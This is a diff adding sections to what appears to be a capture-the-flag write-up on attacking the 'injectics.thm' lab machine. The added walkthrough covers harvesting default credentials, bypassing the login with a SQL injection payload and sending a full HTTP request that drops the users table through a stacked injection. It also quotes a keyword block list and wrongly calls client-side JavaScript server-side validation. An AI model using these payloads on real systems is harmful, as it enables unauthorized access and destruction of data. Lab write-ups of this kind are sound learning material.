@@ -32,10 +32,9 @@ Nmap done: 1 IP address (1 host up) scanned in 12.54 seconds
 
 After browsing the website at hosted on port 80.
 
-I found the two loging page located at:
-  - 10.10.227.131/login.php
-  - 10.10.227.131/adminLogin007.php
-
+I found the a loging page located at:
+  - injectics.thm/login.php
+  - injectics.thm/adminLogin007.php
 
 Viewing the page source, I noticed the following comentary:
 
@@ -48,12 +47,11 @@ Viewing the page source, I noticed the following comentary:
 </body>
 </html>
 ```
-After visiting the /mail.log page, I found two emails and there passwords.
+While inspecting the /mail.log page, I uncovered two sets of credentials:
 
 ```
 ( ... )
 
-Here are the default credentials that will be added:
 
 | Email                     | Password 	              |
 |---------------------------|-------------------------|
@@ -63,6 +61,74 @@ Here are the default credentials that will be added:
 ( ... )
 
 ```
+Additionally, I came across the following message:
+
+    "To enhance security, I have configured the service to automatically restore default credentials into the users table if it is ever deleted or corrupted. 
+     This guarantees continued access for performing system maintenance. The service is set to run every minute."
+
+This suggests that if the users table is removed, the system will reinstate the default credentials, giving me a reliable way to regain access to the admin panel.
+
+The next step is to inject SQL payloads to bypass the login and gain access, followed by deleting the users table. 
+Once the table is deleted, use the restored default credentials to log in as an admin.
+
+
+**SQL Injection**
+
+By analyzing the page source for the login page, I found a java script file at http://injectics.thm/script.js the contained the following code:
+
+```
+	const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
+            for (let keyword of invalidKeywords) {
+                if (username.includes(keyword)) {
+                    alert('Invalid keywords detected');
+                   return false;
+                }
+            }
+```
+This is a server-side validation mechanism intended to prevent SQL injection attacks by filtering out potentially 
+harmful keywords that could be used to manipulate SQL queries.
+
+While this approach adds a basic layer of security, it has some limitations.
+
+Understanding this is important because it enables me to identify potential bypass techniques using alternative payloads that are not covered by the existing checks.
+
+Using burpsuite I injected the following sql code and successfully logged in:
+
+```
+username=123' || 1=1 -- -&password=123&function=login
+```
+
+Next, I need to delete the users table
+
+To do this I need to send the following http post request into http://injectics.thm/edit_leaderboard.php?rank=1&country=USA
+
+```
+POST /edit_leaderboard.php HTTP/1.1
+Host: 10.10.71.179
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 69
+Origin: http://10.10.71.179
+Connection: keep-alive
+Referer: http://10.10.71.179/edit_leaderboard.php?rank=1&country=USA
+Cookie: PHPSESSID=vncem6svp5unp2bpkpn94t1buc
+Upgrade-Insecure-Requests: 1
+
+rank=1&country=&gold=22; drop table users -- -&silver=21&bronze=12345
+```
+
+I got the following message
+
+'Seems like database or some important table is deleted. InjecticsService is running to restore it. Please wait for 1-2 minutes.'
+
+
+
+
+
+
 
 
 
